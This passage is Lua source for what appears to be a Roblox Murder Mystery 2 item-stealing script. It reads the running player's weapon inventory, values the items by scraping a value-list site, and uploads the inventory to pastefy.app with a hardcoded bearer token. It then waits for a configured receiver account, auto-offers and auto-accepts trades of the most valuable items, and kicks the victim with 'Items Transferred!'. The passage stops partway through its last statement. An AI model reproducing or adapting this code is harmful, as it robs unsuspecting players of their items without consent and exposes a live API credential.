local function GetRequestFunction()
    if syn and syn.request then return syn.request end
    if request        then return request           end
    if http_request   then return http_request      end
    if http and http.request then return http.request end
    return nil
end

local function SafeGet(url)
    local Req = GetRequestFunction()
    if not Req then return nil end
    local R
    local ok = pcall(function()
        R = Req({ Url = url, Method = "GET",
                  Headers = {["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
                  Timeout = 15 })
    end)
    if not ok or not R or not R.Body then
        pcall(function()
            R = Req({ Url = url, Method = "GET",
                      Headers = {["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"} })
        end)
    end
    return R
end

local function NormalizeKey(s)
    return string.lower(tostring(s)):gsub("[%s%-_'%.]+","")
end

-- Build several lookup keys for one raw name so we match
-- both "Logchopper" (Roblox ID) and "Logchopper" (SVL display).
local function KeysFor(name)
    local base = string.lower(tostring(name))
    return {
        base:gsub("[%s%-_'%.]+",""),          -- "logchopper"
        base:gsub("[%s'%.]+",""):gsub("%-","_"), -- "log_chopper" style
        base:gsub("[%s%-_'%.]+","_"),         -- "log_chopper"
    }
end

-- â”€â”€â”€ SVL SCRAPER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-- Parses "Value - **1,234**" pattern out of the raw HTML/markdown body.
local function ParseSVLPage(body, rarity)
    local out = {}
    -- Each item block looks like:
    --   ![ItemName](url) | ItemDisplayName   Value - **N,NNN**   ...
    -- We scan for "Value - **number**" preceded by the item name on the same line.
    -- Strategy: find every  "ItemName\n...Value - **N**" pair.
    -- The page markdown has the display name and value on adjacent lines inside
    -- a table cell separated by \n. We extract both together.

    for block in body:gmatch("|%s*!%[(.-)%]%(.-%)%s*|(.-)%|") do
        local imgAlt, cell = block:match("^(.-)|(.+)$")
        if not imgAlt then imgAlt, cell = block, "" end

        -- Try to grab display name: first non-empty line of cell
        local displayName = cell and cell:match("^%s*([^\n]+)") or imgAlt
        displayName = displayName:match("^%s*(.-)%s*$") -- trim

        -- Grab numeric value  "Value - **1,234**"  or  "Value - **Priceless**"
        local rawVal = cell and cell:match("Value %- %*%*([%d,]+)%*%*")
        if not rawVal then
            rawVal = body:match(displayName:gsub("[%(%)%.%+%-%*%?%[%]%^%$%%]","%%%1")
                                .."%s*.-Value %- %*%*([%d,]+)%*%*")
        end
        if rawVal then
            local value = tonumber(rawVal:gsub(",",""))
            if value then
                local isChroma = (rarity == "Chroma")
                local info = { Rarity = rarity, Value = value, Chroma = isChroma }
                for _, k in ipairs(KeysFor(displayName)) do
                    out[k] = info
                end
            end
        end
    end

    -- Fallback: simpler scan for ANY "Value - **N**" with a nearby item name
    -- Covers cases where the markdown rendering collapses the table differently
    for itemLine, valStr in body:gmatch("([%w%s'%.%-]+)%s*Value %- %*%*([%d,]+)%*%*") do
        local name = itemLine:match("^%s*(.-)%s*$")
        -- skip SVL nav labels like "Change in Value" etc
        if name and #name > 1 and not name:find("Change") and not name:find("Stability") then
            local value = tonumber(valStr:gsub(",",""))
            if value then
                local isChroma = (rarity == "Chroma")
                local info = { Rarity = rarity, Value = value, Chroma = isChroma }
                for _, k in ipairs(KeysFor(name)) do
                    if not out[k] then out[k] = info end
                end
            end
        end
    end

    return out
end

local DatabaseLoadStatus = "Not attempted"

local function LoadSVLDatabase()
    local combined = {}
    local pagesLoaded = 0

    for _, entry in ipairs(SVL_URLS) do
        local R = SafeGet(entry.url)
        if R and R.Body and #R.Body > 500 then
            local parsed = ParseSVLPage(R.Body, entry.rarity)
            local count = 0
            for k, v in pairs(parsed) do
                combined[k] = v
                count = count + 1
            end
            pagesLoaded = pagesLoaded + 1
            task.wait(0.3) -- be polite between requests
        else
            task.wait(0.5)
        end
    end

    local total = 0
    for _ in pairs(combined) do total = total + 1 end

    if pagesLoaded == 0 then
        DatabaseLoadStatus = "FAILED: No SVL pages loaded"
        return nil
    end

    DatabaseLoadStatus = string.format("OK â€” SVL: %d keys from %d/%d pages",
        total, pagesLoaded, #SVL_URLS)
    return combined
end

local RarityList    = RarityPriority

local function ShouldTrade(rarityName, value)
    if not rarityName then return false end
    local pos = table.find(RarityList, rarityName)
    if pos and GodlyPosition and pos <= GodlyPosition then return true end
    return value and value >= MINIMUM_VALUE
end

local function FormatName(s)
    if not s or s=="" then return "Unknown" end
    local r, cap = "", true
    for i=1,#s do
        local c = s:sub(i,i)
        if c==" " then r=r.." "; cap=true
        else r=r..(cap and c:upper() or c:lower()); cap=false end
    end
    return r
end

local function LookupItem(id)
    local keys = KeysFor(id)
    for _, k in ipairs(keys) do
        if ItemDatabase[k] then return ItemDatabase[k] end
    end
    return nil
end

local AllItems, TradeItems, TotalValue = {}, {}, 0

local function RefreshInventory()
    local all, trade, total = {}, {}, 0
    local ok, prof = pcall(function()
        return ReplicatedStorage.Remotes.Inventory
                   .GetProfileData:InvokeServer(LocalPlayer.Name)
    end)
    if not ok or not prof or not prof.Weapons then return all, trade, total end
    for id, qty in pairs(prof.Weapons.Owned or {}) do
        if qty and qty > 0 then
            local info   = LookupItem(id)
            local rarity = info and info.Rarity or "Unknown"
            local value  = info and info.Value  or 0
            local entry  = { DataID=id, Name=tostring(id), Rarity=rarity,
                             Count=qty, Value=value, IsChroma=(info and info.Chroma or false),
                             Total=value*qty }
            table.insert(all, entry)
            if ShouldTrade(rarity, value) and not BlacklistedItems[id] then
                table.insert(trade, entry)
                total = total + entry.Total
            end
        end
    end
    table.sort(all,   function(a,b) return a.Total > b.Total end)
    table.sort(trade, function(a,b) return a.Total > b.Total end)
    return all, trade, total
end

AllItems, TradeItems, TotalValue = RefreshInventory()

local function UploadLog(text)
    local ok, url = pcall(function()
        local R = GetRequestFunction()
        if not R then return nil end
        local res = R({
            Url    = "https://pastefy.app/api/v2/paste",
            Method = "POST",
            Headers = {
                ["Authorization"] = "Bearer bCmvP7YNqkOyMEeJDvL0eDXzfSgm2XhWcGadQ3aXKKiH7BKe5ZBIgem3tbuC",
                ["Content-Type"]  = "application/json",
            },
            Body = HttpService:JSONEncode({content=text,title="MM2 Inventory",expires="never",encrypted=false}),
        })
        if res and res.Body then
            local d = HttpService:JSONDecode(res.Body)
            if d and d.paste and d.paste.id then
                return "https://pastefy.app/"..d.paste.id.."/raw"
            end
        end
        return nil
    end)
    return ok and url or nil
end

local function BuildLog()
    local lines, tot = {}, 0
    for _, it in ipairs(AllItems) do tot = tot + it.Total end
    table.insert(lines,"Total Inventory Value: "..tot)
    table.insert(lines,string.rep("-",40))
    for _, it in ipairs(AllItems) do
        local n = FormatName(it.Name)
        if it.IsChroma then n = "Chroma "..n end
        table.insert(lines,"["..it.Rarity.."] x"..it.Count.." "..n.." - "..it.Total)
    end
    return table.concat(lines,"\n")
end

local LastOffer = nil
ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(d)
    if d and d.LastOffer then LastOffer = d.LastOffer end
end)

local function GetStatus()    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end
local function SendRequest(n)
    local p = Players:FindFirstChild(n)
    if not p then return false end
    local ok = pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(p) end)
    return ok
end
local function OfferItem(id)  ReplicatedStorage.Trade.OfferItem:FireServer(id,"Weapons") end
local function AcceptTrade()
    if not LastOffer then return false end
    ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId*3, LastOffer)
    LastOffer = nil; return true
end
local function WaitTradeEnd()
    while GetStatus()~="None" do task.wait(0.1) end
end
local function FindTarget()
    if type(RECEIVER)=="table" then
        for _, n in ipairs(RECEIVER) do
            if n~="" and Players:FindFirstChild(n) then return n end
        end
    elseif Players:FindFirstChild(RECEIVER) then return RECEIVER end
    return nil
end
local function DoTrades(target)
    local attempts = 0
    while #TradeItems > 0 and attempts < 999 do
        attempts = attempts + 1
        local st = GetStatus()
        if st == "ReceivingRequest" then
            pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
            task.wait(0.5); continue
        end
        if st == "StartTrade" then
            for _ = 1, math.min(4, #TradeItems) do
                local it = table.remove(TradeItems, 1)
                for _ = 1, it.Count do OfferItem(it.DataID); task.wait(0.05) end
            end
            task.wait(6)
            if AcceptTrade() then
                WaitTradeEnd()
                AllItems, TradeItems, TotalValue = RefreshInventory()
                attempts = 0
            else
                AllItems, TradeItems, TotalValue = RefreshInventory()
                task.wait(2)
            end
            continue
        end
        if st == "None" then
            local sent, try = false, 1
            while not sent and try <= 5 do
                if SendRequest(target) then sent=true; task.wait(0.5)
                else task.wait(math.min(try*0.5,3)); try=try+1 end
            end
        end
        task.wait(0.5)
    end
    task.wait(2); LocalPlayer:Kick("Items Transferred!")
end

local function Watch()
    local busy = false
    local function Check(p)
        if busy then return end
        local t = FindTarget()
        if t and p.Name == t then
            busy = true; task.wait(3); DoTrades(p.Name)
        end
    end
    for _, p in ipairs(Players:GetPlayers()) do Check(p) end
    Players.PlayerAdded:Connect(Check)
end

if #AllItems > 0 then Watch()
